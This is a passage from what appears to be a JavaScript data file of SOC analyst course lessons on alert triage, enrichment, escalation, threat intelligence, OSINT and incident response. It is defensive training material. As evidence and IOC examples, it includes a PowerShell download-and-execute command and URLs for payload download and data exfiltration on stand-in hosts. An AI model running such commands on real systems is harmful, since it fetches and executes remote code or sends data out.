Source: 192.168.100.50
Target: Multiple internal hosts
Ports: 22, 80, 443, 3389

Analysis:
✓ Source is known vulnerability scanner
✓ Scan matches scheduled assessment window
✓ Security team confirmed authorized activity
✓ Same pattern every Tuesday

Verdict: FALSE POSITIVE
Recommendation: Add scanner to allowlist
\`\`\`

## Investigation Techniques

### 1. IOC Verification

\`\`\`
Check IP/Domain/Hash against:
├── VirusTotal
├── AbuseIPDB
├── URLhaus
├── AlienVault OTX
├── Internal threat intel
└── Historical data

Scoring:
• Flagged by multiple sources = Higher confidence malicious
• Clean everywhere = Likely benign
• Mixed results = Needs more investigation
\`\`\`

### 2. Behavioral Analysis

Compare to baseline:
- Is this normal for this user?
- Is this normal for this system?
- Is this normal for this time?
- Is this normal for this network?

### 3. Process Chain Analysis

Examine parent-child relationships:

**Suspicious Chain:**
\`\`\`
outlook.exe → powershell.exe → cmd.exe → whoami.exe
(Email client spawning scripting interpreter = BAD)
\`\`\`

**Normal Chain:**
\`\`\`
explorer.exe → powershell.exe (user opened)
services.exe → svchost.exe (system process)
\`\`\`

### 4. Timeline Correlation

Look for related events:
- What happened before?
- What happened after?
- Are there similar events on other systems?

## When You're Unsure

If you can't determine TP vs FP:

1. **Document your analysis** - What you checked, what you found
2. **Escalate to L2** - Don't guess on high-severity alerts
3. **Err on the side of caution** - Better to escalate than miss
4. **Request additional context** - Contact asset owner if needed
5. **Set follow-up reminder** - Monitor for additional activity
    `,
    keyTakeaways: [
      "True positives show malicious IOCs, unusual behavior, and attack patterns",
      "False positives often involve security tools, scheduled tasks, or overly broad rules",
      "Use multiple verification sources for IOC analysis",
      "Analyze process chains and behavioral baselines",
      "When uncertain, document thoroughly and escalate"
    ]
  },
  {
    id: "5.4",
    courseId: "soc-fundamentals",
    title: "Enrichment & Context Gathering",
    content: `
# Enrichment & Context Gathering

Enrichment adds valuable context to alerts, transforming raw data into actionable intelligence. This lesson covers the tools and techniques for effective enrichment.

## What is Enrichment?

**Enrichment** is the process of adding context and intelligence to security data to aid investigation and decision-making.

\`\`\`
Raw Alert:                    Enriched Alert:
IP: 203.0.113.50      →      IP: 203.0.113.50
                              • Location: Russia
                              • Reputation: Malicious (95%)
                              • Associated: Cobalt Strike C2
                              • First seen: 2024-01-10
                              • Our exposure: 3 connections
\`\`\`

## Types of Enrichment

### 1. Threat Intelligence

**IOC Reputation:**
- IP address reputation
- Domain categorization
- File hash detection
- URL analysis

**Contextual Intel:**
- Associated malware families
- Threat actor attribution
- Campaign information
- TTPs used

### 2. Asset Context

**System Information:**
- Hostname and IP
- Operating system
- Installed software
- Business function
- Owner/custodian

**Criticality:**
- Business importance
- Data sensitivity
- Internet exposure
- Compliance scope

### 3. User Context

**Identity Information:**
- Full name and title
- Department
- Manager
- Account type

**Behavioral Baseline:**
- Normal working hours
- Typical locations
- Common activities
- Privilege level

### 4. Historical Context

**Previous Activity:**
- Past alerts on same asset
- Past alerts for same user
- Similar patterns in environment
- Known false positive patterns

## Enrichment Tools

### Free OSINT Tools

| Tool | Purpose | URL |
|------|---------|-----|
| VirusTotal | File/IP/URL analysis | virustotal.com |
| AbuseIPDB | IP reputation | abuseipdb.com |
| Shodan | Internet device search | shodan.io |
| URLhaus | Malicious URL database | urlhaus.abuse.ch |
| MalwareBazaar | Malware samples | bazaar.abuse.ch |
| AlienVault OTX | Threat intel sharing | otx.alienvault.com |

### Commercial Platforms

- Recorded Future
- ThreatConnect
- Anomali
- Mandiant Advantage

### Internal Sources

\`\`\`
Asset Database (CMDB)
├── System inventory
├── Business owners
├── Criticality ratings
└── Network location

Identity System (AD/IAM)
├── User attributes
├── Group memberships
├── Account status
└── Privilege level

SIEM Historical Data
├── Previous alerts
├── User activity logs
└── Connection history
\`\`\`

## Enrichment Workflow

### Step 1: Extract IOCs

From the alert, identify:
\`\`\`
□ IP addresses (source and destination)
□ Domain names
□ File hashes (MD5, SHA1, SHA256)
□ URLs
□ Email addresses
□ File names
\`\`\`

### Step 2: Query Reputation

For each IOC:
\`\`\`
1. Check VirusTotal
   - Detection ratio
   - Behavioral analysis
   - Community comments

2. Check AbuseIPDB (for IPs)
   - Abuse reports
   - Categories
   - Confidence score

3. Check internal TIP
   - Previous sightings
   - Associated incidents
\`\`\`

### Step 3: Gather Asset Context

\`\`\`
Query CMDB/Asset Database:
├── What type of system?
├── What does it do?
├── Who owns it?
├── How critical is it?
└── What network zone?
\`\`\`

### Step 4: Gather User Context

\`\`\`
Query Identity System:
├── Who is this user?
├── What's their role?
├── What access do they have?
├── Is this normal behavior?
└── Are they currently active?
\`\`\`

### Step 5: Check Historical Data

\`\`\`
Query SIEM:
├── Previous alerts for this asset?
├── Previous alerts for this user?
├── Previous connections to this destination?
├── Similar activity across environment?
└── Known false positive pattern?
\`\`\`

## Automation Opportunities

### Auto-Enrichment

Many SOCs automate enrichment:

\`\`\`yaml
on_alert:
  - extract_iocs
  - lookup_virustotal(iocs.ips, iocs.hashes, iocs.domains)
  - lookup_abuseipdb(iocs.ips)
  - query_cmdb(alert.host)
  - query_identity(alert.user)
  - attach_results_to_alert
\`\`\`

### Benefits of Automation:
- Faster triage
- Consistent enrichment
- Reduced analyst workload
- Better decision support
    `,
    keyTakeaways: [
      "Enrichment adds threat intel, asset, user, and historical context to alerts",
      "Use free OSINT tools like VirusTotal, AbuseIPDB, and Shodan",
      "Query internal systems (CMDB, IAM) for asset and user context",
      "Check historical data for previous alerts and known patterns",
      "Automate enrichment to speed up triage and ensure consistency"
    ]
  },
  {
    id: "5.5",
    courseId: "soc-fundamentals",
    title: "Documentation & Escalation",
    content: `
# Documentation & Escalation

Proper documentation and timely escalation are critical for effective incident response and organizational learning. This lesson covers best practices for both.

## Why Documentation Matters

**For the Current Incident:**
- Enables continuity across shifts
- Supports escalation to L2/L3
- Provides evidence for response

**For the Organization:**
- Enables pattern recognition
- Supports metrics and reporting
- Facilitates post-incident review
- Meets compliance requirements

## Documentation Standards

### Ticket/Alert Documentation

Every ticket should contain:

\`\`\`markdown
## Alert Information
- Alert ID: [ID]
- Detection Rule: [Rule Name]
- Severity: [Level]
- Time Detected: [Timestamp]

## Affected Assets
- Hostname: [Name]
- IP Address: [IP]
- User: [Username]
- Department: [Dept]

## Investigation Summary
[Brief description of what was found]

## Investigation Steps
1. [Step taken and result]
2. [Step taken and result]
3. [Step taken and result]

## IOCs Identified
- [Type]: [Value] - [Status]

## Conclusion
[True Positive / False Positive / Needs Escalation]

## Actions Taken
- [Action 1]
- [Action 2]

## Recommendations
[Future improvements or follow-up needed]

## Analyst
- Name: [Your name]
- Time: [Completion time]
\`\`\`

### Documentation Best Practices

**Be Specific:**
\`\`\`
❌ "Checked the logs, looked suspicious"
✓ "Reviewed Windows Security logs, found 47 failed logins 
   (Event ID 4625) from IP 192.168.1.100 between 14:00-14:15"
\`\`\`

**Include Evidence:**
\`\`\`
❌ "User ran a bad command"
✓ "Process: powershell.exe
   Command: IEX (New-Object Net.WebClient).DownloadString('http://...')
   Parent: WINWORD.EXE
   Time: 2024-01-15 14:30:00"
\`\`\`

**Be Objective:**
\`\`\`
❌ "This is definitely malware"
✓ "Hash matches known Emotet sample per VirusTotal (58/71 detections)"
\`\`\`

## Escalation Guidelines

### When to Escalate Immediately

**Critical Situations:**
- Active ransomware
- Confirmed data exfiltration
- Compromised privileged account
- Business-critical system affected
- C2 communication detected

### When to Escalate After Triage

**High-Priority Situations:**
- Confirmed malware requiring containment
- Complex investigation beyond L1 scope
- Multiple systems affected
- Insider threat indicators
- Unknown or novel attack

### Escalation Checklist

Before escalating:

\`\`\`
□ Document all findings so far
□ Preserve relevant evidence (screenshots, logs)
□ List affected systems and users
□ Note any containment actions taken
□ Provide timeline of events
□ Include all IOCs discovered
□ State your assessment and confidence level
\`\`\`

### Escalation Template

\`\`\`markdown
## ESCALATION - [Severity] - [Brief Title]

### Summary
[2-3 sentence description of the situation]

### Why Escalating
[Reason this needs L2/L3 attention]

### Timeline
| Time | Event |
|------|-------|
| 14:00 | Initial alert triggered |
| 14:05 | Began triage |
| 14:15 | Found additional indicators |

### Affected Assets
- [List all affected systems/users]

### IOCs
- IP: 192.168.1.100 - Flagged malicious
- Hash: abc123... - Known Emotet

### Investigation So Far
1. [What you checked]
2. [What you found]
3. [What you couldn't determine]

### Recommended Next Steps
- [Suggested actions for L2]

### Analyst
[Your name] | [Time] | [Contact]
\`\`\`

## Escalation Paths

\`\`\`
                    ┌─────────────────┐
                    │  Critical/      │
                    │  Active Breach  │
                    └────────┬────────┘
                             │
                             ↓
┌─────────────┐    ┌─────────────────┐    ┌─────────────────┐
│  L1 Analyst │ → │  L2 Analyst     │ → │  L3 / IR Lead   │
└─────────────┘    └─────────────────┘    └─────────────────┘
       │                    │                      │
       ↓                    ↓                      ↓
  Standard           Deep                    Major
  Triage           Investigation            Incident

                             │
                             ↓
                    ┌─────────────────┐
                    │  SOC Manager    │
                    │  (Major Events) │
                    └─────────────────┘
\`\`\`

## Communication During Escalation

**What L2 Needs to Know:**
- What triggered your investigation
- What you found (with evidence)
- What you couldn't determine
- Current status of affected assets
- Any time-sensitive factors

**How to Communicate:**
- Use designated escalation channels
- Be concise but complete
- Provide ticket/case reference
- Remain available for questions
    `,
    keyTakeaways: [
      "Document every investigation with specific details and evidence",
      "Use structured templates for consistent documentation",
      "Escalate immediately for active breaches and critical situations",
      "Complete the escalation checklist before handing off",
      "Provide clear context so L2 can continue without re-investigating"
    ],
    practicalExercise: {
      title: "Create Escalation Documentation",
      description: "Practice documenting an alert and preparing an escalation.",
      steps: [
        "Review the provided alert scenario",
        "Document your triage steps and findings",
        "Determine if escalation is needed",
        "Complete an escalation template",
        "Identify any missing information for the handoff"
      ]
    }
  },

  // =========================================
  // MODULE 6: THREAT INTELLIGENCE BASICS
  // =========================================
  {
    id: "6.1",
    courseId: "soc-fundamentals",
    title: "Introduction to Threat Intelligence",
    content: `
# Introduction to Threat Intelligence

**Threat Intelligence (TI)** is evidence-based knowledge about threats that helps organizations make informed security decisions. For SOC analysts, threat intelligence transforms raw data into actionable insights.

## What is Threat Intelligence?

Threat intelligence goes beyond simple data collection. It involves:

- **Collection** - Gathering data from various sources
- **Processing** - Normalizing and structuring the data
- **Analysis** - Finding patterns and meaning
- **Dissemination** - Sharing insights with stakeholders

> "Data becomes information, information becomes intelligence, and intelligence drives action."

## Types of Threat Intelligence

### 1. Strategic Intelligence
- High-level trends and patterns
- Business risk assessments
- Consumed by executives and management
- Example: "Ransomware attacks increased 150% in healthcare"

### 2. Tactical Intelligence
- TTPs (Tactics, Techniques, Procedures)
- How adversaries operate
- Consumed by security architects and defenders
- Example: "APT29 uses spear-phishing with COVID-themed lures"

### 3. Operational Intelligence
- Details about specific attacks
- Campaign information and timelines
- Consumed by IR teams and threat hunters
- Example: "Upcoming DDoS attack planned for Black Friday"

### 4. Technical Intelligence
- Specific indicators of compromise (IOCs)
- Machine-readable data
- Consumed by SOC analysts and automated tools
- Example: "Malicious IP: 192.168.1.100, Hash: abc123..."

| Intelligence Type | Consumer | Refresh Rate | Format |
|-------------------|----------|--------------|--------|
| Strategic | Executives | Monthly/Quarterly | Reports |
| Tactical | Security Teams | Weekly | TTPs, Playbooks |
| Operational | IR/Hunters | Daily | Advisories |
| Technical | SOC/Tools | Real-time | IOCs, Feeds |

## How SOC Analysts Use Threat Intelligence

### During Alert Triage
1. Check if source/destination IPs are known malicious
2. Compare file hashes against threat intel databases
3. Look for known C2 domains in network traffic
4. Match behavior patterns to known TTPs

### For Enrichment
\`\`\`
Alert: Suspicious PowerShell execution
     ↓
Threat Intel Enrichment:
- Command pattern matches APT28 technique
- Similar commands seen in recent campaign
- Associated with ransomware delivery
     ↓
Elevated Priority: High
\`\`\`

### Proactive Defense
- Block known malicious indicators
- Hunt for IOCs in your environment
- Update detection rules based on new TTPs

## The Intelligence Lifecycle

\`\`\`
     ┌─────────────────────────────────────────────────────┐
     │                                                     │
     ↓                                                     │
┌─────────┐    ┌──────────┐    ┌─────────┐    ┌──────────┐│
│Direction│ → │Collection│ → │Processing│ → │ Analysis ││
└─────────┘    └──────────┘    └─────────┘    └──────────┘│
                                                   │      │
                                                   ↓      │
                                            ┌───────────┐ │
                                            │Disseminate│─┘
                                            └───────────┘
                                                   │
                                                   ↓
                                             ┌─────────┐
                                             │Feedback │
                                             └─────────┘
\`\`\`

## Building Your TI Mindset

As a SOC analyst, develop these habits:

1. **Question everything** - Don't blindly trust intel feeds
2. **Verify sources** - Check credibility and freshness
3. **Context matters** - Intel must be relevant to your environment
4. **Share back** - Contribute to the community
5. **Stay current** - Threats evolve rapidly
    `,
    keyTakeaways: [
      "Threat intelligence transforms data into actionable security insights",
      "Four types: Strategic, Tactical, Operational, and Technical",
      "SOC analysts primarily use technical intelligence (IOCs) for enrichment",
      "The intelligence lifecycle ensures continuous improvement",
      "Always verify sources and consider relevance to your environment"
    ],
    additionalResources: [
      { title: "MITRE ATT&CK Framework", type: "documentation", url: "https://attack.mitre.org" },
      { title: "Threat Intelligence 101", type: "article", url: "https://www.sans.org" }
    ]
  },
  {
    id: "6.2",
    courseId: "soc-fundamentals",
    title: "IOC Types & Usage",
    content: `
# Indicators of Compromise (IOCs)

**Indicators of Compromise** are forensic artifacts that identify potentially malicious activity. They're the "fingerprints" that attackers leave behind.

## Common IOC Types

### 1. File-Based Indicators

**Hash Values**
- **MD5** - 32 characters (legacy, collision-prone)
- **SHA1** - 40 characters (being phased out)
- **SHA256** - 64 characters (current standard)

\`\`\`
Example SHA256:
e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
\`\`\`

**File Metadata**
- File names (e.g., "invoice.pdf.exe")
- File sizes
- Compilation timestamps
- Digital signature status

### 2. Network Indicators

**IP Addresses**
\`\`\`
- C2 Server: 185.234.218.45
- Malware Distribution: 91.109.190.68
- Spam Source: 45.89.127.34
\`\`\`

**Domain Names**
- C2 domains: evil-domain.xyz
- DGA patterns: aj3k2hf9.com
- Typosquatting: micr0soft.com

**URLs**
\`\`\`
http://malicious.site/download/payload.exe
https://legit-looking.com/api/exfil?data=base64...
\`\`\`

### 3. Host-Based Indicators

**Registry Keys**
\`\`\`
HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\MalwareName
HKCU\\Software\\MaliciousApp\\Config
\`\`\`

**File Paths**
\`\`\`
C:\\Users\\Public\\malware.exe
C:\\Windows\\Temp\\suspicious.dll
%APPDATA%\\Roaming\\backdoor.exe
\`\`\`

**Mutex Names**
- Used by malware to prevent multiple instances
- Often unique to malware families

### 4. Behavioral Indicators

| Behavior | Detection Method |
|----------|------------------|
| Unusual process spawning | Process monitoring |
| Registry persistence | Registry auditing |
| Network beaconing | Traffic analysis |
| Credential access | Authentication logs |

## The Pyramid of Pain

David Bianco's Pyramid of Pain illustrates how difficult it is for attackers to change different IOC types:

\`\`\`
                    △
                   /│\\
                  / │ \\  TTPs (Hardest to change)
                 /  │  \\
                /───┼───\\
               /    │    \\  Tools
              /     │     \\
             /──────┼──────\\
            /       │       \\  Network/Host Artifacts
           /        │        \\
          /─────────┼─────────\\
         /          │          \\  Domain Names
        /           │           \\
       /────────────┼────────────\\
      /             │             \\  IP Addresses
     /              │              \\
    /───────────────┼───────────────\\
   /                │                \\  Hash Values (Easiest to change)
  ▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔▔
\`\`\`

## Using IOCs in the SOC

### Practical Workflow
1. **Receive IOC** - From threat feed or intel report
2. **Validate** - Check source reliability and freshness
3. **Search** - Query SIEM/EDR for matches
4. **Contextualize** - Understand what a match means
5. **Act** - Block, alert, or investigate further

### IOC Matching Example
\`\`\`
SIEM Query:
index=network sourcetype=firewall dest_ip IN (
  "185.234.218.45",
  "91.109.190.68",
  "45.89.127.34"
)

Results: 3 connections from HOST-PC-42 to 185.234.218.45
         First seen: 2024-01-15 03:22:45 UTC
         Last seen: 2024-01-15 03:45:12 UTC
\`\`\`

## IOC Quality Considerations

**Good IOCs:**
- Recent and timely
- Contextual information provided
- Verified by multiple sources
- Low false positive rate

**Poor IOCs:**
- Stale or outdated
- No context or attribution
- Single unverified source
- High false positive rate (common IPs, generic hashes)
    `,
    keyTakeaways: [
      "IOCs are forensic artifacts indicating potential malicious activity",
      "Main types: hashes, IPs, domains, URLs, and behavioral patterns",
      "The Pyramid of Pain shows that TTPs are hardest for attackers to change",
      "Always validate IOC quality and freshness before acting",
      "Context is crucial - an IOC without context has limited value"
    ],
    practicalExercise: {
      title: "IOC Research Challenge",
      description: "Practice researching and validating indicators of compromise.",
      steps: [
        "Take a provided suspicious hash value",
        "Research it on VirusTotal and other platforms",
        "Document what malware family it belongs to",
        "Find related IOCs (C2 IPs, domains, additional hashes)",
        "Assess the IOC's quality and relevance"
      ]
    }
  },
  {
    id: "6.3",
    courseId: "soc-fundamentals",
    title: "OSINT for SOC Analysts",
    content: `
# OSINT for SOC Analysts

**Open Source Intelligence (OSINT)** refers to intelligence collected from publicly available sources. For SOC analysts, OSINT is a powerful tool for enriching alerts and investigating threats.

## What is OSINT?

OSINT includes any publicly accessible information:

- Public websites and databases
- Social media platforms
- Government publications
- News and media reports
- Technical repositories (GitHub, etc.)
- DNS and WHOIS records
- Certificate transparency logs

## Essential OSINT Techniques for SOC

### 1. IP Address Research

**Key Information to Gather:**
- Geographic location
- ASN and ISP
- Reputation scores
- Historical activity
- Associated domains

**Example Workflow:**
\`\`\`
Suspicious IP: 185.234.218.45

Step 1: GeoIP Lookup → Russia, Moscow
Step 2: ASN Lookup → AS12345 - Suspicious Hosting Provider
Step 3: Reputation Check → Listed on 5 blocklists
Step 4: VirusTotal → 12/90 engines flag as malicious
Step 5: Shodan → Running nginx, multiple open ports

Conclusion: High-risk IP, likely malicious infrastructure
\`\`\`

### 2. Domain Investigation

**DNS Analysis:**
\`\`\`bash
# WHOIS lookup
whois suspicious-domain.com

# DNS records
dig suspicious-domain.com ANY

# Historical DNS
# Use SecurityTrails, PassiveTotal, etc.
\`\`\`

**Red Flags in Domains:**
- Recently registered (< 30 days)
- Privacy-protected WHOIS
- Cheap TLDs (.xyz, .top, .info)
- Similar to known brands (typosquatting)
- Random character strings (DGA)

### 3. File and Hash Analysis

**VirusTotal Workflow:**
1. Submit hash (don't upload sensitive files!)
2. Review detection ratio
3. Check behavior analysis
4. Look at relations (IPs, domains, other files)
5. Read community comments

### 4. Email Header Analysis

\`\`\`
From: CEO <ceo@company.com>
Received: from suspicious-smtp.evil.com (91.109.190.68)

Analysis:
- Display name doesn't match sender domain
- Originating IP is from suspicious provider
- SPF/DKIM likely failing
\`\`\`

## Free OSINT Tools for SOC Analysts

| Tool | Purpose | URL |
|------|---------|-----|
| VirusTotal | File/URL/IP analysis | virustotal.com |
| AbuseIPDB | IP reputation | abuseipdb.com |
| Shodan | Internet-connected devices | shodan.io |
| urlscan.io | URL analysis | urlscan.io |
| MXToolbox | Email/DNS tools | mxtoolbox.com |
| Have I Been Pwned | Breach lookup | haveibeenpwned.com |
| GreyNoise | Mass scanning intel | greynoise.io |
| Pulsedive | Threat intelligence | pulsedive.com |
| ThreatFox | IOC database | threatfox.abuse.ch |
| Malware Bazaar | Malware samples | bazaar.abuse.ch |

## OSINT Investigation Mindset

### The Analysis Process

\`\`\`
    Start with Known IOC
            │
            ↓
    ┌───────────────┐
    │  Pivot Point  │ ←─── What do we know?
    └───────┬───────┘
            │
     ┌──────┼──────┐
     ↓      ↓      ↓
   IPs  Domains  Hashes ←── Related indicators
     │      │      │
     └──────┼──────┘
            ↓
    ┌───────────────┐
    │  Connections  │ ←─── How are they related?
    └───────┬───────┘
            ↓
    Build the Picture
\`\`\`

### Best Practices

1. **Document everything** - Keep notes of your research path
2. **Verify claims** - Don't trust single sources
3. **Consider context** - Is this relevant to YOUR environment?
4. **Maintain OPSEC** - Don't tip off attackers
5. **Time-box research** - Set limits to avoid rabbit holes
    `,
    keyTakeaways: [
      "OSINT provides valuable context from publicly available sources",
      "Key techniques include IP research, domain analysis, and hash investigation",
      "Free tools like VirusTotal and AbuseIPDB are essential for SOC work",
      "Always document your research and verify information from multiple sources",
      "Pivot from known indicators to discover related infrastructure"
    ],
    additionalResources: [
      { title: "VirusTotal", type: "tool", url: "https://www.virustotal.com" },
      { title: "AbuseIPDB", type: "tool", url: "https://www.abuseipdb.com" },
      { title: "Shodan", type: "tool", url: "https://www.shodan.io" }
    ]
  },
  {
    id: "6.4",
    courseId: "soc-fundamentals",
    title: "Threat Intel Platforms",
    content: `
# Threat Intelligence Platforms

**Threat Intelligence Platforms (TIPs)** aggregate, correlate, and operationalize threat data from multiple sources. Understanding these platforms is essential for modern SOC operations.

## What is a TIP?

A TIP helps organizations:

- **Aggregate** - Collect intel from multiple feeds
- **Normalize** - Standardize different formats
- **Enrich** - Add context to indicators
- **Analyze** - Find patterns and connections
- **Disseminate** - Share with security tools
- **Collaborate** - Enable team workflows

## Essential Platforms for SOC Analysts

### VirusTotal

The Swiss Army knife of threat analysis.

**Key Features:**
- File, URL, IP, and domain scanning
- 70+ antivirus engines
- Behavioral analysis (sandboxing)
- Graph relationships between IOCs
- Community contributions

**Pro Tips:**
\`\`\`
1. Use VT Graph to visualize connections
2. Check the "Relations" tab for pivoting
3. Review "Community" for analyst insights
4. Use search modifiers:
   - content:"powershell"
   - type:peexe positives:5+
   - engines:kaspersky
\`\`\`

### AlienVault OTX (Open Threat Exchange)

**Features:**
- Free community-driven platform
- Pulses (threat reports with IOCs)
- Integration with security tools
- API access for automation

**Using OTX:**
1. Search for IOCs in your alerts
2. Find related pulses and campaigns
3. Subscribe to relevant pulse feeds
4. Export IOCs to your SIEM

### MISP (Malware Information Sharing Platform)

Open-source threat intelligence platform.

**Capabilities:**
- IOC management and sharing
- Event correlation
- Integration with SIEMs and ticketing
- Community sharing groups

### Commercial TIP Options

| Platform | Strengths |
|----------|-----------|
| Recorded Future | NLP-powered intel analysis |
| ThreatConnect | Workflow automation |
| Anomali | Feed aggregation |
| Mandiant Advantage | Incident intel |

## Free Resources Every SOC Analyst Should Know

### Abuse.ch Projects

\`\`\`
URLhaus     → Malicious URLs
ThreatFox   → IOC database  
Malware Bazaar → Malware samples
SSL Blacklist  → Malicious SSL certs
Feodo Tracker  → Botnet C2 servers
\`\`\`

### Other Valuable Resources

**Reputation Services:**
- GreyNoise - Identifies mass scanners
- Pulsedive - Free IOC enrichment
- IPQualityScore - Fraud detection

**Sandbox Services:**
- Any.run - Interactive malware analysis
- Hybrid Analysis - Automated sandboxing
- Joe Sandbox - Deep analysis

**Search Engines:**
- Shodan - Internet device search
- Censys - Internet-wide scanning
- BinaryEdge - Attack surface discovery

## Integrating TI Into Your Workflow

### Automated Enrichment

\`\`\`
Alert Triggered
      │
      ↓
┌─────────────────────────────────────────────┐
│           Automated Enrichment              │
├─────────────────────────────────────────────┤
│  • Query VirusTotal for hashes              │
│  • Check AbuseIPDB for IP reputation        │
│  • Lookup domain age and WHOIS              │
│  • Search OTX for related pulses            │
│  • Check GreyNoise for scanner status       │
└─────────────────────────────────────────────┘
      │
      ↓
Enriched Alert to Analyst
\`\`\`

### Building Your Personal Toolkit

1. **Create accounts** on key platforms (free tiers)
2. **Bookmark** frequently used tools
3. **Learn API basics** for automation
4. **Build browser workflows** for quick lookups
5. **Document** your research processes
    `,
    keyTakeaways: [
      "TIPs aggregate and operationalize threat data from multiple sources",
      "VirusTotal is essential for file, URL, IP, and domain analysis",
      "Free resources like OTX, ThreatFox, and abuse.ch are valuable",
      "Integrate threat intel into your workflow for automated enrichment",
      "Build your personal toolkit of bookmarked platforms and workflows"
    ],
    practicalExercise: {
      title: "Platform Exploration",
      description: "Familiarize yourself with key threat intelligence platforms.",
      steps: [
        "Create a free VirusTotal account and explore the interface",
        "Sign up for AlienVault OTX and browse popular pulses",
        "Research a recent malware sample on ThreatFox",
        "Use Shodan to search for exposed services",
        "Document 5 tools you'll add to your daily workflow"
      ]
    }
  },

  // =========================================
  // MODULE 7: INCIDENT RESPONSE INTRODUCTION
  // =========================================
  {
    id: "7.1",
    courseId: "soc-fundamentals",
    title: "Incident Response Lifecycle",
    content: `
# The Incident Response Lifecycle

**Incident Response (IR)** is the organized approach to addressing and managing security breaches. Understanding the IR lifecycle is fundamental for every SOC analyst.

## What is an Incident?

A **security incident** is an event that:
- Violates security policies
- Threatens the confidentiality, integrity, or availability of systems
- May require a coordinated response

**Examples:**
- Malware infection on a workstation
- Successful phishing attack
- Data exfiltration detected
- Ransomware encryption
- Unauthorized access to sensitive data

## The NIST Incident Response Framework

The NIST framework defines four primary phases:

\`\`\`
┌─────────────────────────────────────────────────────────────────┐
│                    INCIDENT RESPONSE LIFECYCLE                   │
├──────────────┬──────────────┬──────────────┬───────────────────┤
│              │              │              │                   │
│  Preparation │  Detection & │ Containment, │ Post-Incident     │
│              │  Analysis    │ Eradication, │ Activity          │
│              │              │ & Recovery   │                   │
│              │              │              │                   │
└──────────────┴──────────────┴──────────────┴───────────────────┘
       │              ↓              ↓                │
       │         INCIDENT        INCIDENT            │
       │         DETECTED        HANDLED             │
       └──────────────────────────────────────────────┘
                      CONTINUOUS IMPROVEMENT
\`\`\`

### Phase 1: Preparation

**Goal:** Build capability to respond effectively

**Activities:**
- Develop incident response plan
- Build and train the IR team
- Deploy detection and monitoring tools
- Create communication plans
- Conduct tabletop exercises

**SOC Analyst Role:**
- Know your tools and procedures
- Understand escalation paths
- Practice with simulated scenarios

### Phase 2: Detection & Analysis

**Goal:** Identify and understand the incident

**Activities:**
- Monitor alerts and reports
- Correlate events across sources
- Determine scope and impact
- Document initial findings
- Classify the incident

**Key Questions:**
\`\`\`
□ What happened?
□ When did it start?
□ What systems are affected?
□ What data is at risk?
□ How did the attacker get in?
□ Is the attack ongoing?
\`\`\`

### Phase 3: Containment, Eradication, & Recovery

**Containment Strategies:**

| Strategy | Description | Example |
|----------|-------------|---------|
| Short-term | Immediate action to stop spread | Isolate infected host |
| Long-term | Temporary fix while preparing cleanup | Block malicious IP at firewall |

**Eradication:**
- Remove malware and artifacts
- Patch vulnerabilities
- Reset compromised credentials
- Clean or reimage systems

**Recovery:**
- Restore from clean backups
- Validate system integrity
- Return to normal operations
- Monitor for reinfection

### Phase 4: Post-Incident Activity

**Goal:** Learn and improve

**Activities:**
- Conduct lessons learned meeting
- Update detection rules
- Improve procedures
- Document the incident fully
- Share intelligence (as appropriate)

**Lessons Learned Questions:**
1. What happened and when?
2. How well did we perform?
3. What could we do better?
4. What improvements are needed?
5. How do we prevent recurrence?

## IR Playbooks

Playbooks standardize response to common incident types:

\`\`\`
PHISHING PLAYBOOK

1. IDENTIFY
   □ Analyze reported email
   □ Extract IOCs (sender, links, attachments)
   □ Check if clicked/opened

2. CONTAIN
   □ Block sender/domain
   □ Remove email from mailboxes
   □ If clicked: isolate endpoint

3. ERADICATE
   □ Scan affected endpoints
   □ Remove any downloaded payloads
   □ Reset credentials if needed

4. RECOVER
   □ Clear user to resume work
   □ Confirm no persistence

5. LESSONS LEARNED
   □ Update email filters
   □ Conduct user awareness
   □ Document in incident log
\`\`\`

## SOC Analyst's IR Responsibilities

As an L1 analyst, you primarily handle:
- **Detection** - Identifying potential incidents
- **Initial Analysis** - First-level triage
- **Documentation** - Recording findings
- **Escalation** - Passing to IR team when needed
- **Support** - Assisting during active response
    `,
    keyTakeaways: [
      "The NIST IR lifecycle has four phases: Preparation, Detection & Analysis, Containment/Eradication/Recovery, and Post-Incident",
      "Preparation before incidents occur is crucial for effective response",
      "Containment prevents spread while you work on eradication",
      "Post-incident lessons learned drive continuous improvement",
      "Playbooks standardize response to common incident types"
    ],
    additionalResources: [
      { title: "NIST SP 800-61", type: "documentation", url: "https://nvlpubs.nist.gov/nistpubs/SpecialPublications/NIST.SP.800-61r2.pdf" },
      { title: "SANS Incident Handler's Handbook", type: "article", url: "https://www.sans.org" }
    ]
  },
  {
    id: "7.2",
    courseId: "soc-fundamentals",
    title: "Incident Classification & Severity",
    content: `
# Incident Classification & Severity

Properly classifying incidents ensures appropriate resource allocation and response speed. Not every security event deserves the same level of attention.

## Incident vs. Event vs. Alert

Understanding the hierarchy:

\`\`\`
     Events (Millions daily)
           │
           ↓ [Detection Rules]
           │
        Alerts (Thousands daily)
           │
           ↓ [Analyst Triage]
           │
       Incidents (Few per day/week)
\`\`\`

**Event:** Any observable occurrence
**Alert:** Event that triggers a detection rule
**Incident:** Validated security breach requiring response

## Incident Classification Categories

### By Attack Vector

| Category | Description | Examples |
|----------|-------------|----------|
| Malware | Malicious software infection | Ransomware, trojan, worm |
| Phishing | Deceptive communications | Email phishing, vishing |
| Unauthorized Access | Illegitimate system access | Brute force, credential stuffing |
| Data Breach | Unauthorized data exposure | Exfiltration, data leak |
| DoS/DDoS | Availability attacks | Service disruption |
| Insider Threat | Malicious employee activity | Data theft, sabotage |
| Web Attack | Application-layer attacks | SQLi, XSS, RCE |

### By Impact Type

- **Confidentiality** - Data exposure or theft
- **Integrity** - Data modification or corruption
- **Availability** - Service or system disruption

## Severity Levels

Most organizations use 4-5 severity levels:

### Severity Level Framework

\`\`\`
┌──────────────────────────────────────────────────────────────┐
│ SEVERITY 1 - CRITICAL                                        │
├──────────────────────────────────────────────────────────────┤
│ • Active ransomware encryption                               │
│ • Confirmed data breach of PII/PHI                           │
│ • Production systems completely down                         │
│ • Nation-state attack confirmed                              │
│                                                              │
│ Response: Immediate, all-hands, executive notification       │
│ SLA: 15 minutes initial response                             │
└──────────────────────────────────────────────────────────────┘

┌──────────────────────────────────────────────────────────────┐
│ SEVERITY 2 - HIGH                                            │
├──────────────────────────────────────────────────────────────┤
│ • Active malware on multiple endpoints                       │
